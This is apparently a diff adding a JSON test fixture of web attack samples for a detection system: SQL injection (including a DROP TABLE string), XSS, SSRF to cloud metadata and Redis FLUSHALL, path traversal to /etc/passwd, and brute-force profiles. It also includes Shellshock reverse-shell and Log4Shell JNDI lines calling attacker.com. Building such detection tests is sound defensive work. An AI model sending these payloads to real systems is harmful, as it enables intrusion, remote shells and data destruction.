@@ -1,0 +1,305 @@
+{
+  "sql_injection": [
+    {
+      "payload": "' OR '1'='1",
+      "encoding": "plain",
+      "technique": "authentication_bypass"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "encoding": "plain",
+      "technique": "authentication_bypass"
+    },
+    {
+      "payload": "UNION SELECT username,password FROM users--",
+      "encoding": "plain",
+      "technique": "union_based"
+    },
+    {
+      "payload": "1' AND SLEEP(5)--",
+      "encoding": "plain",
+      "technique": "time_based_blind"
+    },
+    {
+      "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+      "encoding": "plain",
+      "technique": "time_based_blind"
+    },
+    {
+      "payload": "%27%20OR%20%271%27%3D%271",
+      "encoding": "url",
+      "technique": "authentication_bypass"
+    },
+    {
+      "payload": "%55NION%20%53ELECT%20null,null--",
+      "encoding": "url_double",
+      "technique": "union_based"
+    },
+    {
+      "payload": "0x27204f522027313d2731",
+      "encoding": "hex",
+      "technique": "authentication_bypass"
+    },
+    {
+      "payload": "JyBPUiAnMSc9JzE=",
+      "encoding": "base64",
+      "technique": "authentication_bypass"
+    },
+    {
+      "payload": "1; DROP TABLE users--",
+      "encoding": "plain",
+      "technique": "stacked_queries"
+    },
+    {
+      "payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+      "encoding": "plain",
+      "technique": "error_based"
+    },
+    {
+      "payload": "admin'/*",
+      "encoding": "plain",
+      "technique": "comment_injection"
+    },
+    {
+      "payload": "1' ORDER BY 10--",
+      "encoding": "plain",
+      "technique": "column_count"
+    },
+    {
+      "payload": "' WAITFOR DELAY '0:0:5'--",
+      "encoding": "plain",
+      "technique": "mssql_time_based"
+    },
+    {
+      "payload": "pg_sleep(5)--",
+      "encoding": "plain",
+      "technique": "postgresql_time_based"
+    }
+  ],
+  "xss": [
+    {
+      "payload": "<script>alert('XSS')</script>",
+      "type": "reflected",
+      "encoding": "plain"
+    },
+    {
+      "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+      "type": "reflected",
+      "encoding": "url"
+    },
+    {
+      "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+      "type": "reflected",
+      "encoding": "html_entity"
+    },
+    {
+      "payload": "<img src=x onerror=alert(1)>",
+      "type": "dom_stored",
+      "encoding": "plain"
+    },
+    {
+      "payload": "<svg onload=alert(1)>",
+      "type": "dom_stored",
+      "encoding": "plain"
+    },
+    {
+      "payload": "<body onload=javascript:alert(1)>",
+      "type": "dom_stored",
+      "encoding": "plain"
+    },
+    {
+      "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+      "type": "bypass",
+      "encoding": "nested"
+    },
+    {
+      "payload": "<SCRIPT>alert(1)</SCRIPT>",
+      "type": "bypass",
+      "encoding": "case_mutation"
+    },
+    {
+      "payload": "String.fromCharCode(88,83,83)",
+      "type": "bypass",
+      "encoding": "javascript_char"
+    },
+    {
+      "payload": "javascript:alert(1)",
+      "type": "scheme",
+      "encoding": "plain"
+    },
+    {
+      "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "type": "scheme",
+      "encoding": "base64"
+    }
+  ],
+  "brute_force": [
+    {
+      "endpoint": "/login",
+      "rate_rpm": 500,
+      "status_code": 401,
+      "pattern": "rapid_burst",
+      "description": "High volume rapid authentication attempts"
+    },
+    {
+      "endpoint": "/api/v1/auth",
+      "rate_rpm": 15,
+      "status_code": 401,
+      "pattern": "slow_brute",
+      "description": "Low and slow brute force attempt to bypass thresholds"
+    },
+    {
+      "endpoint": "/login.php",
+      "rate_rpm": 120,
+      "status_code": 401,
+      "pattern": "credential_stuffing",
+      "description": "Automated login attempts using leaked credentials"
+    },
+    {
+      "endpoint": "/wp-login.php",
+      "rate_rpm": 5,
+      "status_code": 401,
+      "pattern": "password_spraying",
+      "description": "Testing common passwords against multiple users slowly"
+    },
+    {
+      "endpoint": "/oauth/token",
+      "rate_rpm": 30,
+      "status_code": 401,
+      "pattern": "distributed_brute",
+      "description": "Coordinated authentication attempts from multiple IPs"
+    }
+  ],
+  "ssrf": [
+    {
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "target": "aws_metadata",
+      "technique": "cloud_metadata"
+    },
+    {
+      "payload": "http://169.254.169.254/computeMetadata/v1/",
+      "target": "gcp_metadata",
+      "technique": "cloud_metadata"
+    },
+    {
+      "payload": "http://169.254.169.254/v2/credentials/",
+      "target": "ecs_metadata",
+      "technique": "cloud_metadata"
+    },
+    {
+      "payload": "http://127.0.0.1:6379/",
+      "target": "redis_localhost",
+      "technique": "internal_service"
+    },
+    {
+      "payload": "http://10.0.0.1/admin",
+      "target": "internal network",
+      "technique": "internal_service"
+    },
+    {
+      "payload": "http://10.0.1/admin",
+      "target": "internal_network",
+      "technique": "rfc1918"
+    },
+    {
+      "payload": "http://192.168.1.1/",
+      "target": "gateway",
+      "technique": "rfc1918"
+    },
+    {
+      "payload": "http://172.16.0.1/",
+      "target": "internal_network",
+      "technique": "rfc1918"
+    },
+    {
+      "payload": "file:///etc/passwd",
+      "target": "local_file",
+      "technique": "file_scheme"
+    },
+    {
+      "payload": "dict://localhost:11211/stat",
+      "target": "memcached",
+      "technique": "dict_scheme"
+    },
+    {
+      "payload": "gopher://127.0.0.1:6379/_FLUSHALL",
+      "target": "redis",
+      "technique": "gopher_scheme"
+    }
+  ],
+  "path_traversal": [
+    {
+      "payload": "../../../etc/passwd",
+      "encoding": "plain",
+      "target": "/etc/passwd"
+    },
+    {
+      "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+      "encoding": "url",
+      "target": "/etc/passwd"
+    },
+    {
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "encoding": "url_full",
+      "target": "/etc/passwd"
+    },
+    {
+      "payload": "..%252f..%252f..%252fetc%252fpasswd",
+      "encoding": "double_url",
+      "target": "/etc/passwd"
+    },
+    {
+      "payload": "....//....//....//etc/passwd",
+      "encoding": "double_slash",
+      "target": "/etc/passwd"
+    },
+    {
+      "payload": "../../../windows/system32/cmd.exe",
+      "encoding": "plain",
+      "target": "windows_cmd"
+    },
+    {
+      "payload": "..\\..\\..\\windows\\win.ini",
+      "encoding": "windows_backslash",
+      "target": "windows_ini"
+    },
+    {
+      "payload": "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
+      "encoding": "mixed_url",
+      "target": "windows_ini"
+    },
+    {
+      "payload": "....//....//boot.ini",
+      "encoding": "plain",
+      "target": "boot_ini"
+    }
+  ],
+  "user_agents": {
+    "legitimate": [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (like Gecko) Version/17.0 Safari/605.1.15",
+      "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
+    ],
+    "scanners": [
+      "sqlmap/1.7.8#stable (https://sqlmap.org)",
+      "Nikto/2.1.6",
+      "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
+      "WPScan v3.8.24",
+      "Nmap Scripting Engine",
+      "OpenVAS",
+      "Acunetix Web Vulnerability Scanner/14",
+      "Burp Suite Professional"
+    ],
+    "bots_known": [
+      "Googlebot/2.1 (+http://www.google.com/bot.html)",
+      "Bingbot/2.0; +http://www.bing.com/bingbot.htm",
+      "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
+    ],
+    "cve_poc": [
+      "() { :;}; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+      "${jndi:ldap://attacker.com/exploit}",
+      "Python-urllib/3.11 CVE-2023-24329"
+    ]
+  }
+}
